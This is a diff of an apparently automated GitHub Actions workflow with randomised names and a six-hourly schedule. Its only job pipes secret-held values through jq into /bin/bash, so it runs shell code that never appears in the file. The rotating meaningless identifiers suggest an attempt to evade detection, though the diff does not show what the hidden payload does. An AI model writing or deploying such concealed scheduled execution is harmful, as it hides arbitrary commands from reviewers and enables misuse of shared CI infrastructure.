@@ -1,8 +1,9 @@
 name: yewuqucac
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 2/6 * * *'
+    - cron: '7 0/6 * * *'
 
 jobs:
   build:
@@ -11,13 +12,13 @@ jobs:
       - uses: actions/checkout@v4
       - name: yewuqucac
         env:
-          iltew2: ${{ secrets.iltew2 }}
+          i96833: ${{ secrets.i96833 }}
         run: |
-          echo $iltew2 | jq -r .qgq2824 | /bin/bash
-          echo $nfjxg51191 | jq -r .rexsd4928 | /bin/bash
-          echo $dcn97 | jq -r .bzhtr56688 | /bin/bash
-          echo $iikb65 | jq -r .n51966 | /bin/bash
-          echo $sxip9 | jq -r .lehae2 | /bin/bash
-          echo $hl464 | jq -r .goo5018 | /bin/bash
-          echo $qb7 | jq -r .xbct1 | /bin/bash
+          echo $i96833 | jq -r .rfce9997 | /bin/bash
+          echo $l6 | jq -r .k03 | /bin/bash
+          echo $id913 | jq -r .k097 | /bin/bash
+          echo $udw59421 | jq -r .jwd851 | /bin/bash
+          echo $z979 | jq -r .dae8419 | /bin/bash
+          echo $lt75 | jq -r .vmzfk6820 | /bin/bash
+          echo $vgfk84 | jq -r .lfn72 | /bin/bash
 
